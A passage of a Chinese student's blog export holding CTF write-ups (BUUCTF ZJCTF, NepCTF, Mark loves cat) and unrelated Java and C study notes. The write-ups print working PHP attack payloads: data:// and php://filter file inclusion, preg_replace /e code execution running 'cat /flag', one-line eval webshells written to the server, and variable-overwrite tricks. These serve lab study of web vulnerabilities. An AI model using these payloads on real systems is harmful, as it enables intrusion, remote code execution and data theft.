<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>无法使用</strong></p>
<p>payload2：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>

<p><strong>无法使用</strong></p>
<p>payload3：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,*PD9waHAgc3lzdGVtKCJkaXIiKTs&#x2F;Pg&#x3D;&#x3D;*</span><br></pre></td></tr></table></figure>

<p><strong>可以使用</strong></p>
<p>总结：<br>通过实验发现这个可能是编码的问题因为<?php phpinfo();?>在编成base64的时候出现了+。而浏览器不认识+号。所以解决方法</p>
<p>1.不写后面的?&gt; 因为PHP里面其实不需要写后面的 前面的；号就已经说明结束了。如果没有；号就必须写?&gt;作为结束。</p>
<p>2.添加空格改变base64编码。</p>
<p>3.将+号换成%2b</p>
<p>所以其实不需要通过base64编码来实现！！！<br>将<?php phpinfo();?>改变成url编码。这样浏览器可以识别！<br><img src="/2021/08/06/buu/8/20200610150733928.png" alt="在这里插入图片描述"></p>
<h4 id="php-filter协议"><a href="#php-filter协议" class="headerlink" title="php://filter协议"></a>php://filter协议</h4><p>摘抄于：</p>
<p><a href="https://blog.csdn.net/destiny1507/article/details/82347371">php://filter 的使用_hhh-CSDN博客</a></p>
<p>​    php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；</p>
<p>​    根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西；</p>
<p>构造：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;recource&#x3D;index.php</span><br></pre></td></tr></table></figure>

<p>​    这句话的意思是我们用base64编码的方式来读文件index.php；</p>
<p>​    这时页面会显示出源文件index.php经过base64编码后的内容，然后经过base64解码就可以看到flag；</p>
<p><strong>总之呢，php://filter协议有一下几个应用：</strong></p>
<p>1、利用base64获得源码</p>
<p>2、通过读写编码实行绕过操作</p>
<p><strong>问：为什么需要用base64才可以看到源码 如果本地源码是明文的话那是不是不用过滤器</strong>？</p>
<p>​    include一个文件中有php代码会进行php解析，如果是明文，则会直接返回明文。用了过滤器，如果是php文件就不会解析，就可以拿到php文件的源码了</p>
<p>​    先把要读取的内容经过base64编码然后才能显示出来，之后我们再经过解码就可以是可读的了</p>
<h4 id="preg-replace（）函数"><a href="#preg-replace（）函数" class="headerlink" title="preg_replace（）函数"></a>preg_replace（）函数</h4><p>文章：<a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a></p>
<h3 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h3><p><img src="/2021/08/06/buu/8/image-20210806084045764.png" alt="image-20210806084045764"></p>
<p>代码内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">$text &#x3D; $_GET[&quot;text&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;I have a dream&quot;))&#123;</span><br><span class="line">  echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">  if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line">    die(&quot;Not now!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  include($file); &#x2F;&#x2F;next.php</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>传两个参数，text和file，之间用&amp;连接即可</p>
<p>目的是获得下列提示的    next.php</p>
<p>要满足传入的文件内容为：I have a dream</p>
<p>使用php伪协议中的data:协议和php的filter:协议</p>
<p>构造：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/06/buu/8/image-20210806083956451.png" alt="image-20210806083956451"></p>
<p>解码后代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line"></span><br><span class="line">$_SESSION[&#39;id&#39;] &#x3D; $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line"></span><br><span class="line">  return preg_replace(</span><br><span class="line"></span><br><span class="line">​    &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,</span><br><span class="line"></span><br><span class="line">​    &#39;strtolower(&quot;\\1&quot;)&#39;,</span><br><span class="line"></span><br><span class="line">​    $str</span><br><span class="line"></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $re &#x3D;&gt; $str) &#123;</span><br><span class="line"></span><br><span class="line">  echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line"></span><br><span class="line">  @eval($_GET[&#39;cmd&#39;]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现 preg_replace（）函数是一个代码执行的问题</p>
<p>发现这是用固定解题格式： <strong>\S*=${}</strong></p>
<p><strong>payload1</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">next.php?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/06/buu/8/image-20210806091905315.png" alt="image-20210806091905315"></p>
<p><strong>payload2</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">next.php?\S*&#x3D;$&#123;eval($_POST[cmd])&#125;</span><br></pre></td></tr></table></figure>

<p>输错就会·提示相关函数过滤（这里我是斜杆的符号方向输错导致被匹配过滤）</p>
<p><img src="/2021/08/06/buu/8/image-20210806092259983.png" alt="image-20210806092259983"></p>
<p>上传成功：</p>
<p><img src="/2021/08/06/buu/8/image-20210806092509267.png" alt="image-20210806092509267"></p>
<p><img src="/2021/08/06/buu/8/image-20210806092557240.png" alt="image-20210806092557240"></p>
<p>或者</p>
<p><img src="/2021/08/06/buu/8/image-20210806092640868.png" alt="image-20210806092640868"></p>
<p>借鉴博客：[<a href="https://blog.csdn.net/qq_48008847/article/details/118804275">BJDCTF2020]ZJCTF，不过如此1_十九不瞌睡的博客-CSDN博客</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>nep的签到题</title>
    <url>/2021/03/24/nepnep/nepctf/</url>
    <content><![CDATA[<p> 这次开开心心参加比赛，难过关掉比赛页面(太cai了)</p>
<p>讲讲三个方面签到题</p>
<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>靶机链接：<a href="http://d9a55425-604b-45a0-8ee4-14b465f2c65a.node1.hackingfor.fun/1b5337d0c8ad813197b506146d8d503d/">http://d9a55425-604b-45a0-8ee4-14b465f2c65a.node1.hackingfor.fun/1b5337d0c8ad813197b506146d8d503d/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  error_reporting(0);</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">  $nep &#x3D; $_GET[&#39;nep&#39;];</span><br><span class="line">  $len &#x3D; $_GET[&#39;len&#39;];</span><br><span class="line">  if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13)&#123;</span><br><span class="line">    eval(substr($nep,0,$len));</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    die(&#39;too long!&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这题是传参，也就是要用语句写出payload</p>
<p>payload:    ?len=-1&amp;nep=<code>$_GET[1]</code>;1&amp;1=echo &lt;?php eval($_POST[1]);&gt;2.php</p>
<p>我自己的理解就是，传上len和nep两个量，其中len=-1绕过函数，直接到下一个量</p>
<p>而nep量传参，赋值语句为一句话木马，并且要加上反斜杠，使得语句不会被过滤。</p>
<p><img src="/2021/03/24/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(114).png"></p>
<p><img src="/2021/03/24/nepnep/nepctf/Users/David/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(118).png"></p>
<p><img src="/2021/03/24/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(115).png"></p>
<p><img src="/2021/03/24/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(116).png"></p>
<p><img src="/2021/03/24/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(117).png"></p>
<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><p>啊，其实很简单啊</p>
<p>好气，真的就是只要看出图形就好，我编码解码半天心累</p>
<p>这里用了一个神奇网站：<a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
<p><img src="/2021/03/24/nepnep/nepctf/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(113).png"></p>
<h4 id="cyber"><a href="#cyber" class="headerlink" title="cyber"></a>cyber</h4><p>这里碰到了知识盲区：</p>
<p>猪圈密码，音符密码</p>
<p>看到宝藏文章：<a href="https://blog.csdn.net/Amherstieae/article/details/111134283">https://blog.csdn.net/Amherstieae/article/details/111134283</a></p>
]]></content>
      <tags>
        <tag>nep</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 Mark loves cat</title>
    <url>/2021/08/07/buu/9/</url>
    <content><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><ol>
<li><h5 id="git源码泄露；"><a href="#git源码泄露；" class="headerlink" title=".git源码泄露；"></a>.git源码泄露；</h5></li>
<li><h5 id="导致变量覆盖漏洞（参考CTF之php变量覆盖漏洞）"><a href="#导致变量覆盖漏洞（参考CTF之php变量覆盖漏洞）" class="headerlink" title="$$导致变量覆盖漏洞（参考CTF之php变量覆盖漏洞）"></a><code>$$</code>导致变量覆盖漏洞（参考<a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞</a>）</h5></li>
</ol>
<h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p>靶机启动：</p>
<p><img src="/2021/08/07/buu/9/image-20210807153209853.png" alt="image-20210807153209853"></p>
<p>没有什么有用信息</p>
<p>扫描一下目录</p>
<p><img src="/2021/08/07/buu/9/image-20210807102252828.png" alt="image-20210807102252828"></p>
<p><img src="/2021/08/07/buu/9/image-20210807102702092.png" alt="image-20210807102702092"></p>
<p>（调低线程后）</p>
<p><img src="/2021/08/07/buu/9/image-20210807110900544.png" alt="image-20210807110900544"></p>
<p>发现存在flag.php</p>
<p>我们再用GitHack下载下来。</p>
<p>得到两个文件index.php和flag.php</p>
<h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php:"></a>index.php:</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">$yds &#x3D; &quot;dog&quot;;</span><br><span class="line">$is &#x3D; &quot;cat&quot;;</span><br><span class="line">$handsome &#x3D; &#39;yds&#39;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    $$x &#x3D; $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    $$x &#x3D; $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x &#x3D;&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123;</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;  || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123;</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></figure>

<h5 id="代码审计："><a href="#代码审计：" class="headerlink" title="代码审计："></a>代码审计：</h5><h6 id="摘抄部分"><a href="#摘抄部分" class="headerlink" title="摘抄部分"></a>摘抄部分</h6><p><img src="/2021/08/07/buu/9/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>代码中的变量覆盖漏洞</strong></p>
<p><img src="/2021/08/07/buu/9/202005042321468.png" alt="在这里插入图片描述"></p>
<p><strong>尝试第一个exit处</strong>，</p>
<p>看注释，键名不能有flag，而且又要键名为flag的键值等于其中一个键名，你又要我不存在，又要我存在，进不去这个判断，告辞</p>
<p><img src="/2021/08/07/buu/9/1.jpg" alt="在这里插入图片描述"></p>
<p><strong>尝试第二个exit处</strong></p>
<p>我们想要通过单纯的post参数搞定它是不可能的，因为post处的变量覆盖是让它变成我们可控的值，所以搞不定。</p>
<p>所以可以通过单纯的get或者get+post搞定</p>
<p>可以看到这里是输出的$yds变量，那么我们就要通过变量覆盖达到$yds=$flag的效果</p>
<p>直接说答案比较好分析：get传参 yds=flag；<br>我们看看参数的传递流程：</p>
<p><img src="/2021/08/07/buu/9/20200504233307150.png" alt="在这里插入图片描述"></p>
<p><strong>分析：</strong></p>
<p>在这个里面，首先是 <strong>$x=yds,$=fla</strong>g 。把它带进foreach里面，就变成了$yds=$flag 。</p>
<p>**$$x就相当于是$($x)**，这样就非常好理解变量覆盖漏洞了。</p>
<h5 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?yds&#x3D;flag</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/07/buu/9/image-20210807155151631.png" alt="image-20210807155151631"></p>
<h5 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h5><p>这里是利用了exit($is)。</p>
<p>我们首先看看，要进入判断，执行exit($is)需要的条件，看注释。</p>
<p><img src="/2021/08/07/buu/9/20200504233744435.png" alt="在这里插入图片描述"></p>
<p>那我们就先从post型flag=flag开始：</p>
<p>我们post的数据，会在这一步，把原来的$flag的值改变，因为$x=flag,$y=flag，然后带进去变成了$flag=flag。</p>
<p>over，原来的flag值被我们整没了，这条路不通：</p>
<p><img src="/2021/08/07/buu/9/20200504233839775.png" alt="在这里插入图片描述"></p>
<p>我们试试get型的flag=flag：<br>（答案：is=flag&amp;flag=flag）</p>
<p><img src="/2021/08/07/buu/9/20200504234208601.png" alt="在这里插入图片描述"></p>
<p>首先分析变量覆盖处：</p>
<p>首先是$x=is,$y=flag,带进去就变成了$is=$flag;<br>现在到了第二个参数,$x=flag,$y=flag，带进去变成$flag=$flag，自己变成自己，没啥影响，没有改变flag 的值，成功。</p>
<p><img src="/2021/08/07/buu/9/image-20210807155750060.png" alt="image-20210807155750060"></p>
<h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>参考博客：</p>
<p> <a href="https://blog.csdn.net/jianpanliu/article/details/107028582">BJDCTF2020]Mark loves cat_qtL0ng的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_43622442/article/details/105925473">BJDCTF2020]Mark loves cat (两种解法)（变量覆盖漏洞）_H9_dawn的博客-CSDN博客</a></p>
<p><a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞 - 简书 (jianshu.com)</a></p>
<p><a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞 - 简书 (jianshu.com)</a></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>java学习记录</title>
    <url>/2021/07/09/java/java1/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p> 尝试了好几种编程软件，发生了不同程度报错</p>
<p>pycharm：连接debugger失败</p>
<p>sublintext：扩展较mafan</p>
<p>eclipse：届时应该会用</p>
<p>最终敲定在假期使用vscode来编程java</p>
<h4 id="7-9"><a href="#7-9" class="headerlink" title="7.9"></a>7.9</h4><p>经过昨天的多次失败，今天成功运行了Java，打印出了helloworld</p>
<p>总结一下：<strong>文件名需与类名一致</strong></p>
<p>使用了两个命令 <strong>javac</strong> 和 <strong>java</strong>。</p>
<p>执行前先用Javac编译，注意要带上后缀。</p>
<p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(269).png" alt="屏幕截图(269)"></p>
<p><img src="/2021/07/09/java/java1/662E827A-FA32-4464-B0BD-40087F429E98.jpg" alt="img"></p>
<h5 id="菜鸟教程上的基本语法："><a href="#菜鸟教程上的基本语法：" class="headerlink" title="菜鸟教程上的基本语法："></a>菜鸟教程上的基本语法：</h5><ul>
<li><strong>大小写敏感</strong>：Java 是大小写敏感的，这就意味着标识符 Hello 与 hello 是不同的。</li>
<li><strong>类名</strong>：对于所有的类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 <strong>MyFirstJavaClass</strong> 。</li>
<li><strong>方法名</strong>：所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写。</li>
<li><strong>源文件名</strong>：源文件名必须和类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记 Java 是大小写敏感的），文件名的后缀为 <strong>.java</strong>。（如果文件名和类名不相同则会导致编译错误）。</li>
<li><strong>主方法入口</strong>：所有的 Java 程序由 <strong>public static void main(String[] args)</strong> 方法开始执行。</li>
</ul>
<p>突然发现之前无意中看到的vsdebugger有bug是真的，啊这</p>
<p>调试半天都不行，还是直接cmd命令行更快。乌鱼子。。</p>
<h4 id="7-10"><a href="#7-10" class="headerlink" title="7.10"></a>7.10</h4><p>清晨起来试了一下，很快嗷（doge）</p>
<p>切换vscode里的断点，误打误撞成功了，直接可以编译运行Java文件，好耶</p>
<p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(271).png"></p>
<p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(273).png" alt="屏幕截图(273)"></p>
<p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(272).png"></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>nep_MISC</title>
    <url>/2021/03/15/nepnep/nep%E9%A2%98/</url>
    <content><![CDATA[<p> 解题过程思路来自于<a href="https://blog.csdn.net/Nebula1805/article/details/113833930">https://blog.csdn.net/Nebula1805/article/details/113833930</a></p>
<h5 id="属性-jpg"><a href="#属性-jpg" class="headerlink" title="属性.jpg"></a>属性.jpg</h5><p>签到题，依题意将图片保存后查看属性，得到flag.</p>
<p><img src="/2021/03/15/nepnep/nep%E9%A2%98/%E5%B1%9E%E6%80%A7.jpg"></p>
<h5 id="sring-jpg"><a href="#sring-jpg" class="headerlink" title="sring.jpg"></a>sring.jpg</h5><p>本来想按照上题解，结果发现属性里空空如也</p>
<p>原来这是要用到kali里的string指令</p>
<p>命令格式：<code>strings file</code><br>输入命令<code>strings strings.jpg</code></p>
<p><img src="https://img-blog.csdnimg.cn/20210217143330255.png" alt="在这里插入图片描述"></p>
<h5 id="grep-jpg"><a href="#grep-jpg" class="headerlink" title="grep.jpg"></a>grep.jpg</h5><p>一打开附件，竟然是好康的图（滑稽）</p>
<p>解题重要</p>
<p>用法: <code>grep [选项]... 模式 [文件]...</code><br>输入命令 <code>grep -a &#39;BJD&#39; grep.jpeg</code></p>
<p>同样在kali里实现</p>
<h5 id="aaa-gif"><a href="#aaa-gif" class="headerlink" title="aaa.gif"></a>aaa.gif</h5><p>o,是这么经典的鼓掌</p>
<p>看到闪过的flag图片</p>
<p>Stegsolve工具查看，点击Analyse-&gt;Frame Browser(帧浏览器),查看每一帧</p>
<p>就得到三张关于flag图片</p>
<h5 id="lsb-png"><a href="#lsb-png" class="headerlink" title="lsb.png"></a>lsb.png</h5><p>同样用Stegsolve工具查看，切换通道<br><a href="https://www.cnblogs.com/cat47/p/11483478.html">stegsolve使用方法</a></p>
<p><img src="https://img-blog.csdnimg.cn/20210217151442405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210217151458817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210217151516928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>观察到red，green，blue 0位可能隐藏着信息<br>Analyse-&gt;Data Extract,勾选red，green，blue 0位<br><img src="https://img-blog.csdnimg.cn/20210217153101363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击Preview<br><img src="https://img-blog.csdnimg.cn/20210217153156855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>观察到是png格式，save bin以 png为后缀名<img src="https://img-blog.csdnimg.cn/20210217153310561.png" alt="在这里插入图片描述"><br>得到一张二维码<br><img src="https://img-blog.csdnimg.cn/20210217153439273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫码，得到flag<img src="https://img-blog.csdnimg.cn/20210217154107314.png" alt="在这里插入图片描述"></p>
<h5 id="上课认真听了吗"><a href="#上课认真听了吗" class="headerlink" title="上课认真听了吗"></a>上课认真听了吗</h5><p>根据提示，flag在udp,http,tcp三种流量中，用wireshark打开文件，分别用过滤器锁定三种流量，并以<code>flag&#123;</code> 格式查找<br><img src="https://img-blog.csdnimg.cn/20210218162223708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210218161704740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20210218161834397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05lYnVsYTE4MDU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以flag为flag{25434026}</p>
<h5 id="图片Base64编码"><a href="#图片Base64编码" class="headerlink" title="图片Base64编码"></a>图片Base64编码</h5><p>直接在线Base64转码图片，扫描二维码得到flag</p>
<h5 id="Base编码"><a href="#Base编码" class="headerlink" title="Base编码"></a>Base编码</h5><p>采用了先base32再到base64的过程</p>
<h5 id="16进制查看"><a href="#16进制查看" class="headerlink" title="16进制查看"></a>16进制查看</h5><p>使用了ctf工具包里的工具直接进行查看，flag位于最后几行</p>
<h5 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h5><p>这题很奇怪，我直接绕过了密码，打开flag.txt文件</p>
<p>后来重新几次下载再用工具都提示未有加密文件</p>
]]></content>
      <tags>
        <tag>nep</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言求余问题</title>
    <url>/2020/11/02/c/C%E6%B1%82%E4%BD%99%E5%BE%97%E5%90%84%E4%B8%AA%E4%BD%8D/</url>
    <content><![CDATA[<h4 id="c语言中-a为一个四位数-那么a-1000-100是啥"><a href="#c语言中-a为一个四位数-那么a-1000-100是啥" class="headerlink" title="c语言中 a为一个四位数 那么a%1000/100是啥"></a>c语言中 a为一个四位数 那么a%1000/100是啥</h4><p>假设a的值为1345，那么当a%1000，值为345，那么345/100，结果就是3；<br>所以这个算法是用来取得这个四位数的百位数值</p>
<p>同样的思想应用在水仙花数上，取百位，十位，个位上的数分别为</p>
<p>a，b，c，d</p>
<p>b=a/100；</p>
<p>c=a/10%10;</p>
<p>d=a%10;</p>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>二维数组</title>
    <url>/2020/11/08/c/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<p> 二维数组（矩阵）</p>
<p>例子：int a[6] [6] ;//6*6,6行6列</p>
<p>访问二维数组 </p>
<p>例子: a[0] [0] 访问a数组，第一行第一列中的元素</p>
<p>注意防止越界访问（取值范围）</p>
<p>二维数组初始化，可用嵌套语句for</p>
<p>二维数组也可以对部分元素赋值</p>
<p>如 int a[3] [4]="{{1}，{5}，{9}}"每一列第一个数</p>
<p>二维数组的[ ] [ ]第一个“[ ]”可以不写</p>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>函数递归</title>
    <url>/2020/11/14/c/%E5%87%BD%E6%95%B0%E9%80%92%E5%BD%92/</url>
    <content><![CDATA[<p> 递归思想</p>
<p>格式：void recursion() </p>
<p>{   statements;   … … …   recursion(); /* 函数调用自身 */  </p>
<p> … … … </p>
<p>}</p>
<p>  int main() </p>
<p>{   recursion();</p>
<p> }</p>
<p>应用到求<u><strong>阶乘上，还有斐波那契数列</strong></u></p>
<p> 递归函数可以使它调用其本身</p>
<p>但是存在不利情况：</p>
<p>电脑空间大致分<strong>Heap（堆）</strong>和<strong>Stack（栈）</strong>两种。</p>
<p><strong>栈</strong>是用于<strong>函数</strong>的空间。</p>
<p>电脑调用一个函数，就会使用一层栈；</p>
<p>相反，电脑中一个函数结束（return），就会释放这一层栈，<strong>连同在这层栈（这个函数）中定义的所有东西</strong>。</p>
<p>不在栈中的，应该就在堆中。<strong>（这就是定义全区变量与局部变量的用处）</strong></p>
<p><strong>如果调用太多层栈（太多个函数），**</strong>电脑就会暴空间！**</p>
<p>所以说，调用递归函数，就会<strong>一层一层地压栈</strong>，<strong>电脑就会暴空间！</strong>（<strong>并不代表不建议用递归，只是作提示而已</strong>）</p>
<p><strong>递归</strong>，就是<strong>递（一层一层地调用）</strong>，<strong>归（一层一层地返回）</strong>，这样会<strong>费很多时间</strong>！容易<strong>超时</strong>！</p>
<p><strong>但是，</strong>我并<strong>不是</strong>说不用递归，<strong>而是</strong>说能用递推算法的，最好不用递归算法，（原因你知道）。</p>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言注</title>
    <url>/2020/10/18/c/C%E8%AF%AD%E8%A8%80%E6%B3%A8/</url>
